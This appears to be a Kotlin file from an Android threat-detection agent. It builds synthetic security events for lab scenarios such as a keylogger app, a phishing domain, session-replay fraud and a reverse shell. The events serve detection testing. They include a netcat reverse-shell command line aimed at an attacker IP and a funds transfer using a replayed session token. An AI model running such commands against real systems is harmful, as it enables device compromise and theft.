package com.threatguard.agent.simulation

import android.os.Build
import com.threatguard.agent.model.*
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.UUID

enum class LabScenario(
    val title: String,
    val description: String,
    val expectedImpact: String,
    val expectedMitigation: String,
    val iconName: String
) {
    SUSPICIOUS_APP(
        title = "Suspicious App Behavior",
        description = "Simulates an unknown sideloaded application executing unexpected commands in the background.",
        expectedImpact = "Endpoint Compromise",
        expectedMitigation = "QUARANTINE",
        iconName = "security"
    ),
    ACCESSIBILITY_ABUSE(
        title = "Accessibility Keyhook Simulation",
        description = "Simulates unauthorized accessibility service hooking user touch events and keystrokes.",
        expectedImpact = "Credential Compromise / Host Threat",
        expectedMitigation = "QUARANTINE",
        iconName = "keyboard"
    ),
    FAKE_BANKING_URL(
        title = "Fake Banking Lookalike URL",
        description = "Simulates navigation to a deceptive financial lookalike domain for credential phishing.",
        expectedImpact = "Financial Loss / Credential Compromise",
        expectedMitigation = "URL_BLOCK",
        iconName = "account_balance"
    ),
    FAKE_SHOPPING(
        title = "Fraudulent Shopping Checkout",
        description = "Simulates a deceptive e-commerce checkout flow manipulating item pricing and coupons.",
        expectedImpact = "Financial Loss",
        expectedMitigation = "TRANSACTION_BLOCK",
        iconName = "shopping_cart"
    ),
    TRANSACTION_ABUSE(
        title = "Session Replay / Unauthorized Transfer",
        description = "Simulates unauthorized transaction execution utilizing a hijacked session identifier.",
        expectedImpact = "Financial Loss / Account Takeover",
        expectedMitigation = "TRANSACTION_BLOCK",
        iconName = "payment"
    ),
    REVERSE_SHELL_SIMULATION(
        title = "Anomalous Outbound Shell",
        description = "Simulates an application opening an outbound shell connection to an unknown IP.",
        expectedImpact = "Endpoint Compromise",
        expectedMitigation = "QUARANTINE",
        iconName = "terminal"
    )
}

object ScenarioSimulator {

    private fun getCurrentIsoTimestamp(): String {
        val format = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }
        return format.format(Date())
    }

    fun buildEventForScenario(scenario: LabScenario): ApiSecurityEvent {
        val timestamp = getCurrentIsoTimestamp()
        val eventId = "evt-sim-" + UUID.randomUUID().toString()
        val deviceModel = Build.MODEL ?: "Android-Device"

        return when (scenario) {
            LabScenario.SUSPICIOUS_APP -> {
                val endpoint = EndpointInfo(
                    eventType = "suspicious_process_execution",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a210",
                    processName = "com.suspicious.miner.app",
                    processId = 6120,
                    parentProcess = "zygote64",
                    executablePath = "/data/app/com.suspicious.miner.app/base.apk",
                    commandLine = "powershell.exe -EncodedCommand SYNTHETIC_DEMO",
                    privilegeLevel = "USER",
                    keyboardHook = false,
                    networkConnection = true,
                    elevated = false
                )
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "ENDPOINT",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.102",
                        userAgent = "ThreatGuard-MobileSimulator/1.0",
                        destinationIp = "10.0.2.2",
                        connectionStatus = "success"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/api/endpoint-telemetry"
                    )
                )
            }

            LabScenario.ACCESSIBILITY_ABUSE -> {
                val endpoint = EndpointInfo(
                    eventType = "keylogging",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a150",
                    processName = "com.malicious.accessibility.keylogger",
                    processId = 6240,
                    parentProcess = "zygote",
                    executablePath = "/data/app/com.malicious.accessibility/base.apk",
                    commandLine = "com.malicious.accessibility --capture-touch",
                    privilegeLevel = "USER",
                    keyboardHook = true,
                    networkConnection = false,
                    elevated = false
                )
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "ENDPOINT",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.105",
                        userAgent = "ThreatGuard-MobileSimulator/1.0"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/api/endpoint-telemetry"
                    )
                )
            }

            LabScenario.FAKE_BANKING_URL -> {
                val endpoint = EndpointInfo(
                    eventType = "fake_bank",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a99",
                    processName = "com.android.chrome",
                    processId = 5120,
                    commandLine = "chrome https://secure-login-verify-bank-account.info/login"
                )
                val bodyJson = buildJsonObject {
                    put("suspicious_domain", "secure-login-verify-bank-account.info")
                    put("url", "https://secure-login-verify-bank-account.info/auth/login")
                    put("phishing_url", "/lab/phishing/login")
                    put("credential_submission_observed", true)
                    put("credential_capture_observed", true)
                }
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "ENDPOINT",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.110",
                        userAgent = "Mozilla/5.0 (Linux; Android 14; Mobile)"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/lab/phishing/login",
                        body = bodyJson
                    )
                )
            }

            LabScenario.FAKE_SHOPPING -> {
                val endpoint = EndpointInfo(
                    eventType = "fake_shopping",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a88",
                    processName = "com.fraudulent.store.webview",
                    processId = 5530
                )
                val bodyJson = buildJsonObject {
                    put("scenario", "FAKE_SHOPPING")
                    put("url", "http://fraudulent-mall-deals.com/checkout")
                    put("domain", "fraudulent-mall-deals.com")
                    put("product", "Brand-Name Smartphone")
                    put("price", 10.0)
                    put("social_engineering", true)
                    put("payment", "completed")
                    put("transaction", "suspicious")
                    put("outcome", "product_not_delivered")
                    put("website_status", "unavailable_after_purchase")
                }
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "API",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.115",
                        userAgent = "ThreatGuard-MobileSimulator/1.0"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/api/orders/checkout",
                        body = bodyJson
                    )
                )
            }

            LabScenario.TRANSACTION_ABUSE -> {
                val endpoint = EndpointInfo(
                    eventType = "unauthorized_transaction",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a44",
                    processName = "com.session.hijacker.bot",
                    processId = 5820
                )
                val bodyJson = buildJsonObject {
                    put("action", "transfer_funds")
                    put("beneficiary", "attacker_account_987")
                    put("amount", 9500)
                    put("replayed_session_id", "sess-replayed-token-999")
                }
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "API",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.120",
                        userAgent = "ThreatGuard-MobileSimulator/1.0"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/api/transactions/transfer",
                        body = bodyJson
                    )
                )
            }

            LabScenario.REVERSE_SHELL_SIMULATION -> {
                val endpoint = EndpointInfo(
                    eventType = "reverse_shell",
                    hostname = "android-${deviceModel.lowercase()}",
                    username = "u0_a12",
                    processName = "sh",
                    processId = 5990,
                    commandLine = "sh -i nc -e sh 192.168.1.99 4444",
                    privilegeLevel = "USER",
                    networkConnection = true,
                    elevated = false
                )
                ApiSecurityEvent(
                    eventId = eventId,
                    timestamp = timestamp,
                    domain = "ENDPOINT",
                    network = NetworkInfo(
                        sourceIp = "192.168.1.125",
                        userAgent = "ThreatGuard-MobileSimulator/1.0"
                    ),
                    endpoint = endpoint,
                    request = RequestInfo(
                        method = "POST",
                        endpoint = "/api/endpoint-telemetry"
                    )
                )
            }
        }
    }
}
